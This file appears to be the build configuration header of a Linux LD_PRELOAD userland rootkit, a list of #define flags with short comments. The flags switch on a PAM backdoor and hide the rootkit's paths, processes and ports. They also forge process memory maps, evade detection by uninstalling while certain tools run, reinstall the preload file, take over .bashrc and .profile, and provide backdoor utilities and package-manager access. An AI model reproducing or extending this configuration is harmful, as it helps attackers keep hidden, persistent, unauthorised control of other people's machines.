#define USE_PAM_BD

#define HIDE_SELF // hide all rootkit paths & procs.
#define FORGE_MAPS // hide rootkit location from process mem map files.
#define HIDE_PORTS // hide hidden ports specified from a file.
#define DO_EVASIONS // evade detection by uninstalling during the runtime of certain things...
#define ALWAYS_REINSTALL // when __libc_start_main or execve&p is called reinstall() is also called to make sure the preload file contains what it should & still exists.

#define ROOTKIT_BASHRC // the rootkit writes, maintains & removes .bashrc & .profile. somethings won't work properly wihout this.
#define BACKDOOR_ROLF // is responsible for preparing everything on first backdoor login.
#undef NO_ROOTKIT_ANSI
#define BACKDOOR_UTIL // allows access to a host of backdoor utils.
#define SET_MAGIC_ENV_UNHIDE // set the rootkit's magic environment variable when doing `./bdv unhideself`
#define BACKDOOR_PKGMAN // allows access to certain package managers without ruining the box.

#undef OLD_DISTRO // centos 5 or older. if this is defined you probably want a short gid too.

/* everything past here is setup.py */
